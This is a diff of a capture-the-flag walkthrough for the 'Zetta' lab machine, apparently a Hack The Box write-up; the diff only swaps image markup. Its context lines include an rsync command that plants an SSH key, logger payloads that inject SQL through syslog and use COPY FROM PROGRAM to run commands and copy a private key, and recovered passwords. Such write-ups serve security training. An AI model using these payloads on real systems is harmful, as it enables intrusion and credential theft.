@@ -63,9 +63,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 Seems pretty water-tight to me. Notice that only the HEAD method is allowed? Something for us keep in mind maybe? Anyways, here's how the site looks like.
 
-<a class="image-popup">
-![19de6bf3.png](/assets/images/posts/zetta-htb-walkthrough/19de6bf3.png)
-</a>
+
+{% include image.html image_alt="19de6bf3.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/19de6bf3.png" %}
+
 
 Other than the little JavaScript that generates a 32-character random string for both username and password to the FTP, there's nothing interesting to explore.
 
@@ -73,21 +73,21 @@ Other than the little JavaScript that generates a 32-character random string for
 
 Upon connection to the FTP, I was greeted with the following message.
 
-<a class="image-popup">
-![af6bf114.png](/assets/images/posts/zetta-htb-walkthrough/af6bf114.png)
-</a>
+
+{% include image.html image_alt="af6bf114.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/af6bf114.png" %}
+
 
 There was also a mention of FXP and RFC 2428 in one of service catalog.
 
-<a class="image-popup">
-![548509c8.png](/assets/images/posts/zetta-htb-walkthrough/548509c8.png)
-</a>
+
+{% include image.html image_alt="548509c8.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/548509c8.png" %}
+
 
 We can use the EPRT command to expose it's IPv6 address. The EPRT command specifies an extended address for the data connection. We can simply use `ncat` to listen for incoming IPv6 connections to capture the server's real IPv6 address. This is the IPv6 address of my HTB VPN interface.
 
-<a class="image-popup">
-![a1041613.png](/assets/images/posts/zetta-htb-walkthrough/a1041613.png)
-</a>
+
+{% include image.html image_alt="a1041613.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/a1041613.png" %}
+
 
 The server's IPv6 address must also start with `dead:beef`. :wink:
 
@@ -95,15 +95,15 @@ Specify `2` (IPv6) as the address family and my IPv6 address as the extended add
 
 ***Sending raw FTP commands to the server***
 
-<a class="image-popup">
-![c9c0171f.png](/assets/images/posts/zetta-htb-walkthrough/c9c0171f.png)
-</a>
+
+{% include image.html image_alt="c9c0171f.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/c9c0171f.png" %}
+
 
 ***IPv6 address captured!***
 
-<a class="image-popup">
-![b33566c9.png](/assets/images/posts/zetta-htb-walkthrough/b33566c9.png)
-</a>
+
+{% include image.html image_alt="b33566c9.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/b33566c9.png" %}
+
 
 The IPv6 address of the server is `dead:beef::250:56ff:feb9:33e`.
 
@@ -134,15 +134,15 @@ Interesting. There's `rsyncd` listening at `8730/tcp`.
 
 Time to check it out.
 
-<a class="image-popup">
-![230da2f4.png](/assets/images/posts/zetta-htb-walkthrough/230da2f4.png)
-</a>
+
+{% include image.html image_alt="230da2f4.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/230da2f4.png" %}
+
 
 Notice that it has almost all the modules corresponding to various directories, except for `etc`? Let's see what happens.
 
-<a class="image-popup">
-![a2710b7a.png](/assets/images/posts/zetta-htb-walkthrough/a2710b7a.png)
-</a>
+
+{% include image.html image_alt="a2710b7a.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/a2710b7a.png" %}
+
 
 Jackpot! As usual, let's grab a copy of `/etc/passwd`.
 
@@ -225,21 +225,21 @@ rm -rf $TEMP
 
 Let's give it a shot.
 
-<a class="image-popup">
-![0808d74f.png](/assets/images/posts/zetta-htb-walkthrough/0808d74f.png)
-</a>
+
+{% include image.html image_alt="0808d74f.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/0808d74f.png" %}
+
 
 Of course! `computer` sounds like a password that Roy would use.
 
-<a class="image-popup">
-![645a988c.png](/assets/images/posts/zetta-htb-walkthrough/645a988c.png)
-</a>
+
+{% include image.html image_alt="645a988c.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/645a988c.png" %}
+
 
 Woohoo. The `user.txt` is here.
 
-<a class="image-popup">
-![f87f665f.png](/assets/images/posts/zetta-htb-walkthrough/f87f665f.png)
-</a>
+
+{% include image.html image_alt="f87f665f.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/f87f665f.png" %}
+
 
 ## Low-Privilege Shell
 
@@ -249,9 +249,9 @@ Let's see if we can copy a RSA public key we control to `/home/roy/.ssh/authoriz
 # rsync -6 --password-file=pwd authorized_keys rsync://roy@[dead:beef::250:56ff:feb9:33e]:8730/home_roy/.ssh/
 ```
 
-<a class="image-popup">
-![03d50abd.png](/assets/images/posts/zetta-htb-walkthrough/03d50abd.png)
-</a>
+
+{% include image.html image_alt="03d50abd.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/03d50abd.png" %}
+
 
 Perfect.
 
@@ -259,33 +259,33 @@ Perfect.
 
 During enumeration of roy's account, I noticed a number of `TuDu` entries, particularly one that purportedly writes syslog entries to PostgreSQL database instead.
 
-<a class="image-popup">
-![2304da64.png](/assets/images/posts/zetta-htb-walkthrough/2304da64.png)
-</a>
+
+{% include image.html image_alt="2304da64.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/2304da64.png" %}
+
 
 And another one that talks about password security.
 
-<a class="image-popup">
-![a7f1055a.png](/assets/images/posts/zetta-htb-walkthrough/a7f1055a.png)
-</a>
+
+{% include image.html image_alt="a7f1055a.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/a7f1055a.png" %}
+
 
 On top of that, there are a number of `.git` local repositories as well.
 
-<a class="image-popup">
-![e06c61a6.png](/assets/images/posts/zetta-htb-walkthrough/e06c61a6.png)
-</a>
+
+{% include image.html image_alt="e06c61a6.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/e06c61a6.png" %}
+
 
 There was something interesting with the `rsyslog` commits.
 
-<a class="image-popup">
-![e2b95ae1.png](/assets/images/posts/zetta-htb-walkthrough/e2b95ae1.png)
-</a>
+
+{% include image.html image_alt="e2b95ae1.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/e2b95ae1.png" %}
+
 
 The latest commit talks about adding/adapting template from the manual. If the commit message is to be trusted, then SQL injection might be possible. Also, notice that `option.sql="on"` is set? According to the [documention](https://www.rsyslog.com/doc/master/configuration/templates.html#options),
 
-<a class="image-popup">
-![0e7cdad4.png](/assets/images/posts/zetta-htb-walkthrough/0e7cdad4.png)
-</a>
+
+{% include image.html image_alt="0e7cdad4.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/0e7cdad4.png" %}
+
 
 ### PostgreSQL Dollar-Quoting
 
@@ -293,9 +293,9 @@ _"PostgreSQL has a feature called [dollar-quoting](https://www.postgresql.org/do
 
 ### SQL Injection through Syslog
 
-<a class="image-popup">
-![8781dc2a.png](/assets/images/posts/zetta-htb-walkthrough/8781dc2a.png)
-</a>
+
+{% include image.html image_alt="8781dc2a.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/8781dc2a.png" %}
+
 
 Looking at the template SQL statement, it's possible to inject SQL statements, through the `syslog` message field, `%msg%`.
 
@@ -309,9 +309,9 @@ Let's try this.
 $ logger -s -p local7.info "', now()); DROP TABLE IF EXISTS moss; CREATE TABLE moss(t TEXT); INSERT INTO moss(t) VALUES (\$\$hello\$\$); COPY moss(t) TO \$here\$/tmp/moss\$here\$; -- -"
 ```
 
-<a class="image-popup">
-![6ad1dc12.png](/assets/images/posts/zetta-htb-walkthrough/6ad1dc12.png)
-</a>
+
+{% include image.html image_alt="6ad1dc12.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/6ad1dc12.png" %}
+
 
 Awesome. It works!
 
@@ -325,9 +325,9 @@ Armed with the previous insight, we can probably make use of [CVE-2019-9193](htt
 $ logger -s -p local7.info "', now()); DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(out TEXT); COPY cmd FROM PROGRAM \$cmd\$rm /tmp/moss\$cmd\$; --"
 ```
 
-<a class="image-popup">
-![8133b35a.png](/assets/images/posts/zetta-htb-walkthrough/8133b35a.png)
-</a>
+
+{% include image.html image_alt="8133b35a.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/8133b35a.png" %}
+
 
 Bam. Long story short, this `postgres` account left the SSH private key in the home directory `/var/lib/postgresql`. Let's copy the key to `/tmp` for easy access.
 
@@ -335,17 +335,17 @@ Bam. Long story short, this `postgres` account left the SSH private key in the h
 $ logger -s -p local7.info "', now()); DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(out TEXT); COPY cmd FROM PROGRAM \$cmd\$cp /var/lib/postgresql/.ssh/id_rsa /tmp/sshh; chmod 666 /tmp/sshh\$cmd\$; --"
 ```
 
-<a class="image-popup">
-![7c864680.png](/assets/images/posts/zetta-htb-walkthrough/7c864680.png)
-</a>
+
+{% include image.html image_alt="7c864680.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/7c864680.png" %}
+
 
 ## Final Privilege Escalation
 
 Armed with the SSH private key of `postgres`, I can simply log in to the account through SSH.
 
-<a class="image-popup">
-![227bc178.png](/assets/images/posts/zetta-htb-walkthrough/227bc178.png)
-</a>
+
+{% include image.html image_alt="227bc178.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/227bc178.png" %}
+
 
 During enumeration of the postgres account, I notice its password lying around in the `.psql_history`.
 
@@ -360,15 +360,15 @@ ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
 
 Recall the `TuDu` entry about the password scheme? Could this be `root`'s password as well?
 
-<a class="image-popup">
-![d133640c.png](/assets/images/posts/zetta-htb-walkthrough/d133640c.png)
-</a>
+
+{% include image.html image_alt="d133640c.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/d133640c.png" %}
+
 
 Indeed. The password is `sup3rs3cur3p4ass@root`! Well, with that, getting `root.txt` is easy.
 
-<a class="image-popup">
-![1538975e.png](/assets/images/posts/zetta-htb-walkthrough/1538975e.png)
-</a>
+
+{% include image.html image_alt="1538975e.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/1538975e.png" %}
+
 
 :dancer:
 
